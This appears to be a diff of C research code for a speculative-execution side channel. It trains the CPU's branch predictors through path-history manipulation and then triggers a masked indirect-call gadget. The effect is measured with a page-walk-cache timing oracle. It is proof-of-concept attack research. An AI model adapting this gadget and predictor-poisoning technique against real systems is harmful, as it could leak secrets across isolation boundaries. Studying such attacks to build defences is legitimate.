@@ -1,11 +1,14 @@
 #include "mapping.h"
 #include "pwsc.h"
 #include "util.h"
+#include <emmintrin.h>
 #include <time.h>
 
 extern void set_phr(int value);
 extern void shift_phr();
 extern void clear_phr();
+
+volatile int arch_exec = 0;
 
 __attribute__((section(".secret_section"), used, noinline)) void
 secret_function(void) {
@@ -25,35 +28,16 @@ signal_function(void) {
   return;
 }
 
-__attribute__((noinline)) static void
-unmasked_gadget(void *secret_ptr, uint64_t mask, int arch_exec) {
-  /*
-asm volatile("call overwrite_arch_return_addr\n\t"
-             "spec_return:\n\t"
-             "movq (%0), %%rax\n\t" // secret = *secret_ptr
-             "and %%rbx, %%rax\n\n" // mask(secret)
-             //"movb (%%rax), %%al\n\t" // *secret
-             "call *%%rax\n\t"
-             "infinite_loop:\n\t"
-             "pause\n\t"
-             "jmp infinite_loop\n\t"
-             "overwrite_arch_return_addr:\n\t"
-             "movq $arch_return, (%%rsp)\n\t"
-             "clflush (%%rsp)\n\t"
-             "cpuid\n\t"
-             "movq %1, %%rbx\n\t"
-             "ret\n\t"
-             "arch_return:\n\t"
-             :
-             : "r"(secret_ptr), "r"(mask)
-             : "%rax", "%rbx", "%rcx", "%rdx");
-             */
+__attribute__((noinline)) static void unmasked_gadget(void *secret_ptr,
+                                                      uint64_t mask, int phr) {
+  clear_phr();
+  set_phr(phr);
 
   if (arch_exec) {
     asm volatile("movq %0, %%rax\n\t"
                  "movq %1, %%rbx\n\t"
                  "andq %%rbx, %%rax\n\t"
-                 "call *%%rax\n\t"
+                 "call *%%rax\n\t" // Get prediction from IBP
                  :
                  : "r"(secret_ptr), "r"(mask)
                  : "%rax", "%rbx", "%rcx", "%rdx");
@@ -61,25 +45,28 @@ asm volatile("call overwrite_arch_return_addr\n\t"
 }
 
 uint64_t setup_trigger(uint64_t target, uint64_t phase, uint64_t __trash) {
+  // Get the machine in known state before page walk
   (void)phase;
   int phr_value;
   for (int i = 0; i < 100; ++i) {
-    clear_phr();
+    arch_exec = 1; // Bias the CBP
     phr_value = rand() % 2;
-    set_phr(phr_value);
-    if (phr_value)
-      unmasked_gadget(signal_function, ~0x7fff000000000000, 1);
+    if (phr_value) // Insert value into IBP
+      unmasked_gadget(signal_function, ~0x7fff000000000000, phr_value);
     else
-      unmasked_gadget(noise_function, ~0x7fff000000000000, 1);
+      unmasked_gadget(noise_function, ~0x7fff000000000000, phr_value);
   }
   return __trash;
 }
 
 uint64_t trigger(uint64_t target, uint64_t phase, uint64_t __trash) {
+  // Trigger page walk
+  arch_exec = 1; // Changing condition value
+  _mm_mfence();
+  _mm_clflush((void *)&arch_exec); // Flushing
   if (phase) {
-    clear_phr();
-    set_phr(1);
-    unmasked_gadget(NULL, ~0x7fff000000000000, 0);
+    unmasked_gadget(signal_function, ~0x7fff000000000000,
+                    1); // Calling the gadget
   }
   return __trash;
 }
@@ -143,8 +130,8 @@ int main(void) {
   fprintf(stderr, "Using the PWC order oracle\n");
   fprintf(stderr, "Architectural derefence\n");
   fprintf(stderr, "Fast configurations\n");
-  pwsc_init_reset(setup_trigger, NULL, trigger, DEFAULT_EVICT_SIZES,
-                  THRESHOLD_FAST, NUM_TRIALS_FAST);
+  pwsc_init_reset(setup_trigger, NULL, trigger,
+                  MEMORY_MAP_ORDER_ORACLE_EVICT_SIZES, 10, 64);
 
   int init_noise_filter[64] = {0};
 
